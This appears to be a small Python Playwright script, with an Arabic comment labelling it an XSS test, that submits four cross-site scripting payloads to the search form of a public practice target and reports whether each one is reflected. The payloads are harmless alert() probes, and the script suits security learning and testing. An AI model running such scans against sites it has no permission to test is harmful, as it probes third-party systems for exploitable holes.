#ثغرة xss

from playwright.sync_api import sync_playwright

payloads = [
    "<script>alert('xss found')</script>",
    "<svg><script>alert(1)<p>",
    "<svg><x><script>alert(1)</x>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>", 
       
]

# input name="searchFor"
# input name="goButton"

in_one = "input[name='searchFor']"
in_two = "input[type='submit']"


url = "http://testphp.vulnweb.com/"
with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    page.goto(url)
    for payload in payloads:
        page = browser.new_page()
        page.goto(url)
        page.fill(in_one,payload)
        page.click(in_two)
        if payload in page.content():
            print(f"[+] Xss Found in : {url} , payload : {payload}")
            
        else:
            print(f"[-] Xss not found in : {url} , payload : {payload}")
    browser.close()
